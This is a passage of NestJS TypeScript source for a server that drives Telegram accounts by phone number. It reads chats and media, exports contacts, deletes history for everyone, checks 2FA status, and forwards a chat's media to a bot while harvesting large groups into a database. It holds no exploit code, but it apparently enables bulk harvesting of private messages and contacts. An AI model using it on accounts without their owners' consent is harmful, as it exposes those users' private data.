@Query('maxId') maxId?: number,\n        @Query('all') all?: boolean\n    ) {\n        return this.telegramService.getMediaMetadata(mobile, {\n            chatId,\n            types,\n            startDate: startDate ? new Date(startDate) : undefined,\n            endDate: endDate ? new Date(endDate) : undefined,\n            limit,\n            minId,\n            maxId,\n            all\n        });\n    }\n\n    @Get('media/filter/:mobile')\n    @ApiOperation({ summary: 'Get filtered media messages from a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true, description: 'Chat ID to get media from' })\n    @ApiQuery({ name: 'types', required: false, enum: ['photo', 'video', 'document', 'voice'], isArray: true })\n    @ApiQuery({ name: 'startDate', required: false, description: 'Filter media after this date' })\n    @ApiQuery({ name: 'endDate', required: false, description: 'Filter media before this date' })\n    @ApiQuery({ name: 'limit', required: false, type: Number, description: 'Number of media items to fetch' })\n    @ApiQuery({ name: 'minId', required: false, type: Number, description: 'Minimum message ID' })\n    @ApiQuery({ name: 'maxId', required: false, type: Number, description: 'Maximum message ID' })\n    @ApiResponse({ status: 200, type: [MediaMetadataDto] })\n    async getFilteredMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types') types?: ('photo' | 'video' | 'document' | 'voice')[],\n        @Query('startDate') startDate?: string,\n        @Query('endDate') endDate?: string,\n        @Query('limit') limit?: number,\n        @Query('minId') minId?: number,\n        @Query('maxId') maxId?: number\n    ) {\n        return this.telegramService.getFilteredMedia(mobile, {\n            chatId,\n            types,\n            startDate: startDate ? new Date(startDate) : undefined,\n            endDate: endDate ? new Date(endDate) : undefined,\n            limit,\n            minId,\n            maxId\n        });\n    }\n\n    @Get('group/members/:mobile')\n    @ApiOperation({ summary: 'Get group members' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupMembers(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.telegramService.getGrpMembers(mobile, groupId);\n    }\n\n    @Post('chat/block/:mobile')\n    @ApiOperation({ summary: 'Block a chat/user' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat/User ID to block', required: true })\n    async blockChat(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.telegramService.blockUser(mobile, chatId);\n    }\n\n    @Delete('chat/:mobile')\n    @ApiOperation({ summary: 'Delete or clear a chat history for a user' })\n    @ApiParam({\n        name: 'mobile',\n        description: 'Mobile number of the user whose chat should be deleted',\n        required: true,\n        example: '1234567890',\n    })\n    @ApiQuery({\n        name: 'peer',\n        description: 'Username or Peer ID of the chat to delete',\n        required: true,\n        example: 'someusername',\n    })\n    @ApiQuery({ name: 'maxId', required: false, description: 'Delete messages with ID  maxId', example: 100000 })\n    @ApiQuery({ name: 'justClear', required: false, description: 'Only clear history for this user', example: false })\n    @ApiQuery({ name: 'revoke', required: false, description: 'Delete for everyone if possible', example: true })\n    @ApiQuery({ name: 'minDate', required: false, description: 'Minimum date (UNIX timestamp)', example: 1609459200 })\n    @ApiQuery({ name: 'maxDate', required: false, description: 'Maximum date (UNIX timestamp)', example: 1612137600 })\n    async deleteChatHistory(\n        @Param('mobile') mobile: string,\n        @Query() deleteHistoryDto: DeleteHistoryDto,\n    ) {\n        return this.telegramService.deleteChat(mobile, deleteHistoryDto);\n    }\n\n    // Additional Message Operations\n    @Get('messages/inline/:mobile')\n    @ApiOperation({ summary: 'Send message with inline button' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'message', required: true })\n    @ApiQuery({ name: 'url', required: true })\n    async sendMessageWithInlineButton(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('message') message: string,\n        @Query('url') url: string\n    ) {\n        return this.telegramService.sendInlineMessage(mobile, chatId, message, url);\n    }\n\n    // Dialog Management\n    @Get('dialogs/:mobile')\n    @ApiOperation({ summary: 'Get all dialogs' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'limit', required: false, type: Number, description: 'Number of dialogs to fetch', default: 500 })\n    @ApiQuery({ name: 'offsetId', required: false, type: Number, description: 'Offset ID for pagination', default: 0 })\n    @ApiQuery({ name: 'archived', required: false, type: Boolean, description: 'Include archived chats', default: false })\n    async getAllDialogs(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit: number = 500,\n        @Query('offsetId') offsetId: number = 0,\n        @Query('archived') archived: boolean = false\n    ) {\n        return this.telegramService.getDialogs(mobile, { limit, archived, offsetId });\n    }\n\n    @Get('last-active/:mobile')\n    @ApiOperation({ summary: 'Get last active time' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Last active time retrieved successfully' })\n    async getLastActiveTime(@Param('mobile') mobile: string) {\n        return this.telegramService.getLastActiveTime(mobile);\n    }\n\n    // Enhanced Group Management\n    @Post('group/create/:mobile')\n    @ApiOperation({ summary: 'Create a new group with advanced options' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: createGroupDto })\n    async createGroupWithOptions(\n        @Param('mobile') mobile: string,\n        @Body() options: createGroupDto\n    ) {\n        return this.telegramService.createGroupWithOptions(mobile, options);\n    }\n\n    @Post('group/settings/:mobile')\n    @ApiOperation({ summary: 'Update group settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupSettingsDto })\n    async updateGroupSettings(\n        @Param('mobile') mobile: string,\n        @Body() settings: GroupSettingsDto\n    ) {\n        return this.telegramService.updateGroupSettings(mobile, settings);\n    }\n\n    @Post('group/members/:mobile')\n    @ApiOperation({ summary: 'Add members to a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async addGroupMembers(\n        @Body() memberOp: GroupMemberOperationDto,\n        @Param('mobile') mobile: string,\n    ) {\n        return this.telegramService.addGroupMembers(\n            mobile,\n            memberOp.groupId,\n            memberOp.members\n        );\n    }\n\n    @Delete('group/members/:mobile')\n    @ApiOperation({ summary: 'Remove members from a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async removeGroupMembers(\n        @Body() memberOp: GroupMemberOperationDto,\n        @Param('mobile') mobile: string,\n    ) {\n        return this.telegramService.removeGroupMembers(\n            mobile,\n            memberOp.groupId,\n            memberOp.members\n        );\n    }\n\n    @Post('group/admin/:mobile')\n    @ApiOperation({ summary: 'Promote or demote group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    async handleAdminOperation(\n        @Body() adminOp: AdminOperationDto,\n        @Param('mobile') mobile: string\n    ) {\n        if (adminOp.isPromote) {\n            return this.telegramService.promoteToAdmin(\n                mobile,\n                adminOp.groupId,\n                adminOp.userId,\n                adminOp.permissions,\n                adminOp.rank\n            );\n        } else {\n            return this.telegramService.demoteAdmin(\n                mobile,\n                adminOp.groupId,\n                adminOp.userId\n            );\n        }\n    }\n\n    @Post('chat/cleanup/:mobile')\n    @ApiOperation({ summary: 'Clean up chat history' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ChatCleanupDto })\n    async cleanupChat(\n        @Param('mobile') mobile: string,\n        @Body() cleanup: ChatCleanupDto\n    ) {\n        return this.telegramService.cleanupChat(mobile, {\n            chatId: cleanup.chatId,\n            beforeDate: cleanup.beforeDate ? new Date(cleanup.beforeDate) : undefined,\n            onlyMedia: cleanup.onlyMedia,\n            excludePinned: cleanup.excludePinned\n        });\n    }\n\n    @Get('chat/statistics/:mobile')\n    @ApiOperation({ summary: 'Get chat statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    @ApiQuery({ name: 'period', enum: ['day', 'week', 'month'], description: 'Statistics period', required: false })\n    async getChatStatistics(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('period') period: 'day' | 'week' | 'month' = 'week'\n    ): Promise<ChatStatistics> {\n        return this.telegramService.getChatStatistics(mobile, chatId, period);\n    }\n\n    // Message Scheduling\n    @Post('messages/schedule/:mobile')\n    @ApiOperation({ summary: 'Schedule a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ScheduleMessageDto })\n    async scheduleMessage(\n        @Param('mobile') mobile: string,\n        @Body() schedule: ScheduleMessageDto\n    ) {\n        return this.telegramService.scheduleMessage(mobile, {\n            chatId: schedule.chatId,\n            message: schedule.message,\n            scheduledTime: new Date(schedule.scheduledTime),\n            replyTo: schedule.replyTo,\n            silent: schedule.silent\n        });\n    }\n\n    @Get('messages/scheduled/:mobile')\n    @ApiOperation({ summary: 'Get scheduled messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    async getScheduledMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.telegramService.getScheduledMessages(mobile, chatId);\n    }\n\n    // Enhanced Media Operations\n    @Post('media/voice/:mobile')\n    @ApiOperation({ summary: 'Send voice message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async sendVoiceMessage(\n        @Param('mobile') mobile: string,\n        @Body() voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        return this.telegramService.sendVoiceMessage(mobile, voice);\n    }\n\n    @Post('media/view-once/:mobile')\n    @ApiOperation({ summary: 'Send a view once (disappearing) media message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiConsumes('multipart/form-data', 'application/json')\n    @ApiBody({\n        schema: {\n            type: 'object',\n            properties: {\n                chatId: { type: 'string', description: 'Chat ID to send the media to' },\n                sourceType: { type: 'string', enum: ['path', 'base64', 'binary'], description: 'Source type of media' },\n                path: { type: 'string', description: 'path of the media file (when sourceType is Path)' },\n                base64Data: { type: 'string', description: 'Base64 data (when sourceType is base64)' },\n                binaryData: { type: 'string', format: 'binary', description: 'Binary file (when sourceType is binary)' },\n                caption: { type: 'string', description: 'Optional caption for the media' },\n                filename: { type: 'string', description: 'Optional filename for the media' }\n            },\n            required: ['chatId', 'sourceType']\n        }\n    })\n    @UseInterceptors(FileInterceptor('binaryData', {\n        storage: multer.memoryStorage()\n    }))\n    @ApiResponse({ status: 200, description: 'View once media sent successfully' })\n    @ApiResponse({ status: 400, description: 'Failed to send view once media' })\n    async sendViewOnceMedia(\n        @Param('mobile') mobile: string,\n        @UploadedFile() file: Express.Multer.File,\n        @Body() viewOnceDto: ViewOnceMediaDto\n    ) {\n\n        // Handle file upload case\n        if (viewOnceDto.sourceType === MediaSourceType.BINARY && file) {\n            return this.telegramService.sendViewOnceMedia(mobile, {\n                chatId: viewOnceDto.chatId,\n                sourceType: viewOnceDto.sourceType,\n                binaryData: file.buffer,\n                caption: viewOnceDto.caption,\n                filename: viewOnceDto.filename || file.originalname\n            });\n        }\n\n        // Handle JSON payload case (URL or base64)\n        return this.telegramService.sendViewOnceMedia(mobile, {\n            chatId: viewOnceDto.chatId,\n            sourceType: viewOnceDto.sourceType,\n            path: viewOnceDto.path,\n            base64Data: viewOnceDto.base64Data,\n            caption: viewOnceDto.caption,\n            filename: viewOnceDto.filename\n        });\n    }\n\n    // Advanced Chat Operations\n    @Get('chat/history/:mobile')\n    @ApiOperation({ summary: 'Get chat history with metadata' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'offset', required: false, type: Number })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getChatHistory(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('offset') offset?: number,\n        @Query('limit') limit?: number\n    ) {\n        return this.telegramService.getMessagesNew(mobile, chatId, offset, limit);\n    }\n\n    @Post('group/admin/promote/:mobile')\n    @ApiOperation({ summary: 'Promote members to admin' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    async promoteToAdmin(\n        @Param('mobile') mobile: string,\n        @Body() adminOp: AdminOperationDto\n    ) {\n        return this.telegramService.promoteToAdmin(\n            mobile,\n            adminOp.groupId,\n            adminOp.userId,\n            adminOp.permissions,\n            adminOp.rank\n        );\n    }\n\n    @Post('group/admin/demote/:mobile')\n    @ApiOperation({ summary: 'Demote admin to regular member' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async demoteAdmin(\n        @Param('mobile') mobile: string,\n        @Body() memberOp: GroupMemberOperationDto\n    ) {\n        return this.telegramService.demoteAdmin(\n            mobile,\n            memberOp.groupId,\n            memberOp.members[0]\n        );\n    }\n\n    @Post('group/unblock/:mobile')\n    @ApiOperation({ summary: 'Unblock a user in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async unblockGroupUser(\n        @Param('mobile') mobile: string,\n        @Body() data: {\n            groupId: string;\n            userId: string;\n        }\n    ) {\n        return this.telegramService.unblockGroupUser(mobile, data.groupId, data.userId);\n    }\n\n    @Get('group/admins/:mobile')\n    @ApiOperation({ summary: 'Get list of group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupAdmins(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.telegramService.getGroupAdmins(mobile, groupId);\n    }\n\n    @Get('group/banned/:mobile')\n    @ApiOperation({ summary: 'Get list of banned users in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupBannedUsers(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.telegramService.getGroupBannedUsers(mobile, groupId);\n    }\n\n    // Advanced Contact Management\n    @Post('contacts/export/:mobile')\n    @ApiOperation({ summary: 'Export contacts in vCard or CSV format' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactExportImportDto })\n    async exportContacts(\n        @Param('mobile') mobile: string,\n        @Body() exportDto: ContactExportImportDto,\n        @Res() res: Response\n    ) {\n        const data = await this.telegramService.exportContacts(\n            mobile,\n            exportDto.format,\n            exportDto.includeBlocked\n        );\n\n        const filename = `contacts_${mobile}_${new Date().toISOString()}.${exportDto.format}`;\n        res.setHeader('Content-Type', exportDto.format === 'vcard' ? 'text/vcard' : 'text/csv');\n        res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n        res.send(data);\n    }\n\n    @Post('contacts/import/:mobile')\n    @ApiOperation({ summary: 'Import contacts from a list' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async importContacts(\n        @Param('mobile') mobile: string,\n        @Body() contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        return this.telegramService.importContacts(mobile, contacts);\n    }\n\n    @Post('contacts/block/:mobile')\n    @ApiOperation({ summary: 'Manage blocked contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactBlockListDto })\n    async manageBlockList(\n        @Param('mobile') mobile: string,\n        @Body() blockList: ContactBlockListDto\n    ) {\n        return this.telegramService.manageBlockList(\n            mobile,\n            blockList.userIds,\n            blockList.block\n        );\n    }\n\n    @Get('contacts/statistics/:mobile')\n    @ApiOperation({ summary: 'Get contact activity statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Contact statistics retrieved successfully' })\n    async getContactStatistics(@Param('mobile') mobile: string) {\n        return this.telegramService.getContactStatistics(mobile);\n    }\n\n    // Chat Folder Management\n    @Post('folders/create/:mobile')\n    @ApiOperation({ summary: 'Create a new chat folder' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: CreateChatFolderDto })\n    async createChatFolder(\n        @Param('mobile') mobile: string,\n        @Body() folder: CreateChatFolderDto\n    ) {\n        return this.telegramService.createChatFolder(mobile, folder);\n    }\n\n    @Get('folders/:mobile')\n    @ApiOperation({ summary: 'Get all chat folders' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getChatFolders(@Param('mobile') mobile: string) {\n        return this.telegramService.getChatFolders(mobile);\n    }\n\n    @Put('messages/:mobile')\n    @ApiOperation({ summary: 'Edit message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async editMessage(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        return this.telegramService.editMessage(mobile, options);\n    }\n\n    @Post('chat/settings/:mobile')\n    @ApiOperation({ summary: 'Update chat settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async updateChatSettings(\n        @Param('mobile') mobile: string,\n        @Body() settings: {\n            chatId: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n            username?: string;\n        }\n    ) {\n        return this.telegramService.updateChatSettings(mobile, settings);\n    }\n\n    @Post('media/batch/:mobile')\n    @ApiOperation({ summary: 'Send multiple media files in batch' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async sendMediaBatch(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        return this.telegramService.sendMediaBatch(mobile, options);\n    }\n\n    @Get('security/2fa-status/:mobile')\n    @ApiOperation({ summary: 'Check if 2FA password is set' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async hasPassword(@Param('mobile') mobile: string) {\n        return this.telegramService.hasPassword(mobile);\n    }\n\n    @Get('chats/:mobile')\n    @ApiOperation({ summary: 'Get chats with advanced filtering' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getChats(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit?: number,\n        @Query('offsetDate') offsetDate?: number,\n        @Query('offsetId') offsetId?: number,\n        @Query('offsetPeer') offsetPeer?: string,\n        @Query('folderId') folderId?: number\n    ) {\n        return this.telegramService.getChats(mobile, {\n            limit,\n            offsetDate,\n            offsetId,\n            offsetPeer,\n            folderId\n        });\n    }\n\n    @Get('file/url/:mobile')\n    @ApiOperation({ summary: 'Get downloadable URL for a file' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getFileUrl(\n        @Param('mobile') mobile: string,\n        @Query('url') url: string,\n        @Query('filename') filename: string\n    ): Promise<string> {\n        return this.telegramService.getFileUrl(mobile, url, filename);\n    }\n\n    @Get('messages/stats/:mobile')\n    @ApiOperation({ summary: 'Get message statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getMessageStats(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        return this.telegramService.getMessageStats(mobile, options);\n    }\n\n    @Get('chats/top-private/:mobile')\n    @ApiOperation({ summary: 'Get top 5 private chats with detailed statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getTopPrivateChats(@Param('mobile') mobile: string) {\n        return this.telegramService.getTopPrivateChats(mobile);\n    }\n\n    @Post('bots/add-to-channel/:mobile')\n    @ApiOperation({ summary: 'Add bots to channel with admin privileges' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({\n        schema: {\n            type: 'object',\n            properties: {\n                channelIds: {\n                    type: 'array',\n                    items: {\n                        type: 'string'\n                    },\n                    description: 'Array of channel IDs to add bots to. If not provided, will use default channels from environment variables.'\n                }\n            }\n        }\n    })\n    @ApiResponse({ status: 200, description: 'Bots added to channels successfully' })\n    async addBotsToChannel(\n        @Param('mobile') mobile: string,\n        @Body() body: { channelIds?: string[] }\n    ) {\n        return this.telegramService.addBotsToChannel(mobile, body.channelIds);\n    }\n\n    //Create bot endpoints\n    @Post('bot/create/:mobile')\n    @ApiOperation({ summary: 'Create a new bot using BotFather' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: CreateBotDto })\n    @ApiResponse({\n        status: 201,\n        description: 'Bot created successfully',\n        schema: {\n            type: 'object',\n            properties: {\n                botToken: { type: 'string', description: 'The token to access HTTP Bot API' },\n                username: { type: 'string', description: 'The username of the created bot' }\n            }\n        }\n    })\n    @ApiResponse({ status: 400, description: 'Bad Request - Invalid bot details' })\n    @ApiResponse({ status: 401, description: 'Unauthorized - Client not connected' })\n    async createBot(\n        @Param('mobile') mobile: string,\n        @Body() createBotDto: CreateBotDto\n    ) {\n        return this.telegramService.createBot(mobile, createBotDto);\n    }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { TelegramController } from './Telegram.controller';\nimport { TelegramService } from './Telegram.service';\nimport { UsersModule } from '../users/users.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { TelegramValidationConfig } from './config/telegram-validation.config';\n\n@Module({\n    imports: [\n        forwardRef(() => UsersModule),\n        BufferClientModule,\n        forwardRef(() => ActiveChannelsModule),\n        forwardRef(() => ChannelsModule)\n    ],\n    controllers: [TelegramController],\n    providers: [\n        TelegramService,\n        TelegramValidationConfig,\n        {\n            provide: 'TELEGRAM_LOGGER',\n            useValue: TelegramLogger.getInstance()\n        }\n    ],\n    exports: [TelegramService]\n})\nexport class TelegramModule { }\n","import { UsersService } from '../users/users.service';\nimport TelegramManager from \"./TelegramManager\";\nimport { BadRequestException, HttpException, Inject, Injectable, OnModuleDestroy, forwardRef } from '@nestjs/common';\nimport { CloudinaryService } from '../../cloudinary';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport * as path from 'path';\nimport { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { EntityLike } from 'telegram/define';\nimport { parseError } from '../../utils/parseError';\nimport { ChannelInfo } from './types/telegram-responses';\nimport { connectionManager } from './utils/connection-manager';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { DialogsQueryDto } from './dto/metadata-operations.dto';\nimport { ChatStatistics, ContentFilter, GroupOptions, MessageScheduleOptions } from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport * as fs from 'fs';\nimport { sleep } from 'telegram/Helpers';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { SearchMessagesDto } from './dto/message-search.dto';\nimport { CreateBotDto } from './dto/create-bot.dto';\nimport { Api } from 'telegram';\nimport { shouldMatch } from '../../utils';\n\n@Injectable()\nexport class TelegramService implements OnModuleDestroy {\n    private readonly logger: TelegramLogger;\n    private cleanupInterval: NodeJS.Timer;\n\n    constructor(\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n    ) {\n        this.logger = TelegramLogger.getInstance();\n        this.cleanupInterval = connectionManager.startCleanupInterval();\n        connectionManager.setUsersService(this.usersService);\n    }\n\n    async onModuleDestroy() {\n        this.logger.logOperation('system', 'Module destroy initiated');\n        clearInterval(this.cleanupInterval as NodeJS.Timeout);\n        await connectionManager.disconnectAll();\n    }\n    public getActiveClientSetup() {\n        return TelegramManager.getActiveClientSetup();\n    }\n\n    public setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.setActiveClientSetup(data);\n    }\n\n    async getMessages(mobile: string, username: string, limit: number = 8) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.getMessages(username, limit);\n    }\n\n\n    async getMessagesNew(mobile: string, username: string, offset: number, limit: number) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.getMessagesNew(username, offset, limit);\n    }\n\n    async sendInlineMessage(mobile: string, chatId: string, message: string, url: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.sendInlineMessage(chatId, message, url);\n    }\n\n    async getChatId(mobile: string, username: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getchatId(username);\n    }\n\n    async getLastActiveTime(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getLastActiveTime();\n    }\n\n    async tryJoiningChannel(mobile: string, chatEntity: Channel) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.joinChannel(chatEntity.username);\n            console.log(telegramClient.phoneNumber, \" - Joined channel Success - \", chatEntity.username);\n            if (chatEntity.canSendMsgs) {\n                // try {\n                //     await this.activeChannelsService.update(chatEntity.channelId, chatEntity);\n                //     console.log(\"updated ActiveChannels\");\n                // } catch (error) {\n                //     console.log(parseError(error));\n                //     console.log(\"Failed to update ActiveChannels\");\n                // }\n            } else {\n                await this.channelsService.remove(chatEntity.channelId);\n                await this.activeChannelsService.remove(chatEntity.channelId);\n                console.log(\"Removed Channel- \", chatEntity.username);\n            }\n        } catch (error) {\n            console.log(telegramClient.phoneNumber, \" - Failed to join - \", chatEntity.username);\n            this.removeChannels(error, chatEntity.channelId, chatEntity.username);\n            throw error\n        }\n    };\n\n    async removeChannels(error: any, channelId: string, username: string) {\n        if (error.errorMessage == \"USERNAME_INVALID\" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes(\"No user has\")) {\n            try {\n                if (channelId) {\n                    await this.channelsService.remove(channelId)\n                    await this.activeChannelsService.remove(channelId);\n                    console.log(\"Removed Channel- \", channelId);\n                } else {\n                    const channelDetails = (await this.channelsService.search({ username: username }))[0];\n                    await this.channelsService.remove(channelDetails.channelId)\n                    await this.activeChannelsService.remove(channelDetails.channelId);\n                    console.log(\"Removed Channel - \", channelDetails.channelId);\n                }\n            } catch (searchError) {\n                console.log(\"Failed to search/remove channel: \", searchError);\n            }\n        } else if (error.errorMessage === \"CHANNEL_PRIVATE\") {\n            await this.channelsService.update(channelId, { private: true })\n            await this.activeChannelsService.update(channelId, { private: true });\n        }\n    }\n\n    async getGrpMembers(mobile: string, entity: EntityLike) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.getGrpMembers(entity)\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n\n    async addContact(mobile: string, data: { mobile: string, tgId: string }[], prefix: string) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.addContact(data, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n\n    async addContacts(mobile: string, phoneNumbers: string[], prefix: string) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.addContacts(phoneNumbers, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n    async getSelfMsgsInfo(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getSelfMSgsInfo();\n    }\n\n    async createGroup(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.createGroup();\n    }\n\n    async forwardMedia(mobile: string, channel: string, fromChatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        telegramClient.forwardMedia(channel, fromChatId);\n        setTimeout(async () => {\n            try {\n                await this.leaveChannel(mobile, \"2302868706\");\n            } catch (error) {\n                console.log(\"Error in forwardMedia: \", error);\n            }\n        }, 5 * 60000);\n        return \"Media forward initiated\";\n    }\n\n    async forwardMediaToBot(mobile: string, fromChatId: string): Promise<string> {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            await telegramClient.forwardMediaToBot(fromChatId);\n            const dialogs = await telegramClient.getDialogs({ limit: 500 });\n            const channels = dialogs\n                .filter(chat => chat.isChannel || chat.isGroup)\n                .map(chat => {\n                    const chatEntity = chat.entity as Api.Channel;\n                    const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;\n\n                    if (!chatEntity.broadcast &&\n                        !cannotSendMsgs &&\n                        chatEntity.participantsCount > 50 &&\n                        shouldMatch(chatEntity)) {\n\n                        return {\n                            channelId: chatEntity.id.toString(),\n                            canSendMsgs: true,\n                            participantsCount: chatEntity.participantsCount,\n                            private: false,\n                            title: chatEntity.title,\n                            broadcast: chatEntity.broadcast,\n                            megagroup: chatEntity.megagroup,\n                            restricted: chatEntity.restricted,\n                            sendMessages: true,\n                            username: chatEntity.username,\n                            forbidden: false\n                        };\n                    }\n                    return null;\n                })\n                .filter((channel): channel is NonNullable<typeof channel> => Boolean(channel));\n\n            await this.channelsService.createMultiple(channels);\n            await 